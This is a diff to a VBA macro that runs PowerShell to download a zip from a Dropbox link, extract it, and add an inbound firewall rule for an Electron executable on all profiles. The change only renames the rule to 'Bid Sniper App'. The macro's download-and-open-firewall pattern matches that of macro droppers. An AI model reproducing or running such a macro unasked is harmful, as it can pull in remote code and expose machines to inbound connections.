@@ -30,7 +30,7 @@ Sub DownloadAndExtract()
         "if (Test-Path $fullExtractPath) { Remove-Item $fullExtractPath -Recurse -Force }" & vbCrLf & _
         "Start-BitsTransfer -Source $url -Destination $zipFile" & vbCrLf & _
         "Expand-Archive -Path $zipFile -DestinationPath $extractPath -Force" & vbCrLf & _
-        "New-NetFirewallRule -DisplayName ""Allow Electron App"" -Direction Inbound -Program ""$fullExtractPath\node_modules\electron\dist\electron.exe"" -Action Allow -Profile Any"
+        "New-NetFirewallRule -DisplayName ""Allow Bid Sniper App"" -Direction Inbound -Program ""$fullExtractPath\node_modules\electron\dist\electron.exe"" -Action Allow -Profile Any"
 
     psCommand = "powershell -NoProfile -Command " & _
                 """& {" & downloadAndExtractScript & "} -url '" & dropboxUrl & "' -zipFile '" & zipFile & "' -extractPath '" & extractPath & "' -fullExtractPath '" & fullExtractPath & "' 2>&1 | Out-File -FilePath '" & logFile & "' -Encoding utf8"""
